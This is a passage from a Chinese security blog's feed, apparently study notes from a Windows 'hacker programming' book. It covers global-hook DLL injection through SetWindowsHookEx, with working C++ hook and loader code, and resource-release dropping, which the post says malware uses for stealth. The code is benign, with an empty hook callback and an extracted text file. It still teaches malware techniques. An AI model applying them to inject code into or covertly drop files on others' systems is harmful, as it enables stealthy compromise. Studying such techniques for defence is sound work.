align="left">WH_MOUSE<br>7</td><td>安装监视鼠标消息的挂钩过程</td></tr><tr><td align="left">WH_MOUSE_LL<br>14</td><td>安装监视低级鼠标输入事件的挂钩过程</td></tr><tr><td align="left">WH_MSGFILTER<br>-1</td><td>安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息</td></tr><tr><td align="left">WH_SHELL<br>10</td><td>安装接受对于shell应用程序有用通知的钩子程序</td></tr><tr><td align="left">WH_SYSMSGFILTER<br>6</td><td>安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息，钩子程序监视与调用线程相同桌面中所有应用程序的这些消息</td></tr></tbody></table><p>lpfn：一个指向钩子程序的指针。如果dwThreadId参数为0或指定由不同进程创建线程标识符，则lpfn参数必须指向DLL中的钩子过程。否则，lpfn可以指向与当前进程关联的代码中的钩子过程。</p><p>hMod：包含由lpfn参数指向的钩子过程的DLL句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子过程位于与当前进程关联的代码中，则hMod参数必须设置为NULL。</p><p>dwThreadId：与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。</p><h5 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h5><p>如果函数成功，则返回值是钩子过程的句柄。</p><p>如果函数失败，则返回值为NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>创建全局钩子，钩子函数需要在一个DLL文件中。进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子的实现在DLL中的话，则在对应事件发生的时候，系统会把这个DLL加载到发生事件的进程地址空间之中，使它能够调用钩子函数进行处理。创建一个全局钩子之后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中，这样就实现了DLL注入。</p><p>设置idHook的值为WH_GETMESSAGE就可以让DLL注入到所有的进程中，因为WH_GETMESSAGE类型的钩子会监视消息队列，并且Windows系统是基于消息驱动的，所有进程都会有一个自己的消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。</p><p>DLL文件如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="comment">//共享内存</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;mydata&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span></span><br><span class="line">HMODULE g_hDllModule = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 钩子回调函数</span></span><br><span class="line"><span class="function">LRESULT <span class="title">GetMsgProc</span><span class="params">(<span class="keyword">int</span> code, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置全局钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_hHook = <span class="built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == g_hHook)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnsetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        g_hDllModule = hModule;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局钩子是以DLL形式加载到其他进程空间之中的，且进程都是独立的，任意修改其中的一个内存里的数据是不会影响另一个进程的。所在DLL中创建了共享内存，共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL之中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，就相当于多个进程共享一个内存。</p><p>编写一个调用DLL的程序，test.exe</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_SetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_UnsetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">typedef_SetGlobalHook SetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">typedef_UnsetGlobalHook UnsetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按下回车开始设置钩子\n&quot;</span>);</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">hDll = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;Hook.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;加载DLL失败\n错误代码%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">SetGlobalHook = (typedef_SetGlobalHook)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;SetGlobalHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == SetGlobalHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取函数地址失败\n错误代码%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">bRet = <span class="built_in">SetGlobalHook</span>();</span><br><span class="line"><span class="keyword">if</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;设置钩子成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;设置钩子失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">UnsetGlobalHook = (typedef_UnsetGlobalHook)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;UnsetGlobalHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == UnsetGlobalHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取函数地址失败\n错误代码%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">UnsetGlobalHook</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;卸载钩子成功\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>可以先试用PC hunter工具进行查看，可以看到当前没有任何消息钩子存在。</p><p><img src="/2021/07/08/%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/1.png"></p><p>打开我们的test.exe，设置好钩子之后，再进行查看，刷新一下消息钩子列表，如图可以看到已经存在了一个消息钩子。</p><p><img src="/2021/07/08/%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/2.png"></p><p>使用OD附加打开notepad.exe，再打开模块窗口。</p><p><img src="/2021/07/08/%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/3.png"></p><p>再打开test.exe，进行钩子设置。可以很明显看到变化，已经注入成功了。</p><p><img src="/2021/07/08/%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/4.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;全局钩子注入&quot;&gt;&lt;a href=&quot;#全局钩子注入&quot; class=&quot;headerlink&quot; title=&quot;全局钩子注入&quot;&gt;&lt;/a&gt;全局钩子注入&lt;/h4&gt;&lt;p&gt;windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。&lt;/p&gt;
&lt;p&gt;局部钩子是针对</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="注入" scheme="https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>资源释放</title>
    <link href="https://b1ack1e.github.io/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/"/>
    <id>https://b1ack1e.github.io/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/</id>
    <published>2021-07-08T03:52:26.000Z</published>
    <updated>2021-07-09T03:35:22.401Z</updated>
    
    <content type="html"><![CDATA[<h2 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h2><p>恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型文件，将它们可以作为资源插入到程序中，在程序运行的时候再将它们释放到本地上，这样恶意代码会更加隐蔽。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置"><a href="#FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置" class="headerlink" title="FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置"></a>FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HRSRC FindResourceW(</span><br><span class="line">  HMODULE hModule,</span><br><span class="line">  LPCWSTR lpName,</span><br><span class="line">  LPCWSTR lpType</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hModule：处理包含资源的可执行文件模块。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>lpName：指定资源名称</p><p>lpType：指定资源类型</p><p>返回值：如果函数运行成功，那么返回值为指定资源信息块的句柄。可将这个句柄传递给其它函数获取其他信息。如果失败，则返回NULL；</p><h5 id="SizeofResource函数：获取指定资源的字节数"><a href="#SizeofResource函数：获取指定资源的字节数" class="headerlink" title="SizeofResource函数：获取指定资源的字节数"></a>SizeofResource函数：获取指定资源的字节数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD SizeofResource(</span><br><span class="line">  HMODULE hModule,</span><br><span class="line">  HRSRC   hResInfo</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。</p><p>返回值：如果函数运行成功，则返回值为资源的字节数；如果函数运行失败，则返回值为0；</p><h5 id="LoadResource函数：装载指定资源到全局存储器"><a href="#LoadResource函数：装载指定资源到全局存储器" class="headerlink" title="LoadResource函数：装载指定资源到全局存储器"></a>LoadResource函数：装载指定资源到全局存储器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HGLOBAL LoadResource(</span><br><span class="line">  HMODULE hModule,</span><br><span class="line">  HRSRC   hResInfo</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。</p><p>返回值：如果函数运行成功，则返回值为相关资源数据的句柄。如果函数运行失败，则返回值为NULL。</p><h5 id="LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针"><a href="#LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针" class="headerlink" title="LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针"></a>LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPVOID LockResource(</span><br><span class="line">  HGLOBAL hResData</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hResData：装载资源的句柄。函数LoadResource可以返回这个句柄。</p><p>返回值：如果装载资源被锁住，则返回值是资源的第一个字节的指针；反之则为NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>创建一个test.txt文件，写入内容</p><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png"></p><p>在程序中添加一个自定义资源，自定义资源名称为“MYRES”，再将刚才创建的txt文件添加进去</p><p>程序实现源代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FreeRes.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="comment">//资源控件名称，资源名称，释放后的名称</span></span><br><span class="line"><span class="function">BOOL <span class="title">FreeRes</span><span class="params">(UINT uiResourceName,TCHAR* lpszResType,<span class="keyword">char</span>* lpszSaveFileName)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取指定模块的资源</span></span><br><span class="line">    HRSRC hRes = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(uiResourceName), lpszResType);</span><br><span class="line">    <span class="keyword">if</span> (hRes == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;获取资源失败&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取大小</span></span><br><span class="line">    DWORD dwSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, hRes);</span><br><span class="line">    <span class="keyword">if</span> (dwSize == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;获取字节数失败&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//装载资源</span></span><br><span class="line">    HGLOBAL hGlobal = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, hRes);</span><br><span class="line">    <span class="keyword">if</span> (hGlobal == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;装载资源失败&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//锁定资源</span></span><br><span class="line">    LPVOID lPvoid = <span class="built_in">LockResource</span>(hGlobal);</span><br><span class="line">    <span class="keyword">if</span>(lPvoid == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;锁定资源失败&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始释放资源</span></span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="built_in">fopen_s</span>(&amp;fp, lpszSaveFileName, <span class="string">&quot;wb+&quot;</span>);<span class="comment">//wb+读写打开或建立一个二进制文件，允许读和写</span></span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;写入资源失败&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fwrite</span>(lPvoid, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span>), dwSize, fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;按下回车键开始释放资源\n&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    BOOL FLAG=<span class="built_in">FreeRes</span>(IDR_MYRES2,<span class="built_in">TEXT</span>(<span class="string">&quot;MYRES&quot;</span>),<span class="string">&quot;free.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (FLAG == TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;释放成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;释放失败\n&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/2.png"></p><p>查看free.txt内容</p><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/3.png"></p><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;资源释放&quot;&gt;&lt;a href=&quot;#资源释放&quot; class=&quot;headerlink&quot; title=&quot;资源释放&quot;&gt;&lt;/a&gt;资源释放&lt;/h2&gt;&lt;p&gt;恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>写在前面的话</title>
    <link href="https://b1ack1e.github.io/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/"/>
    <id>https://b1ack1e.github.io/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/</id>
    <published>2021-07-08T03:50:10.000Z</published>
    <updated>2021-07-08T09:40:20.968Z</updated>
    
    <content type="html"><![CDATA[<p>一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。</p><p>现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。</p><p>最后的最后，我是不知名小团队satter的b1ackie。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。&lt;/p&gt;
&lt;p&gt;现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。&lt;/p&gt;
&lt;p&gt;最后的最后，我是不知名小团队satter的b1a</summary>
      
    
    
    
    
  </entry>
  
</feed>
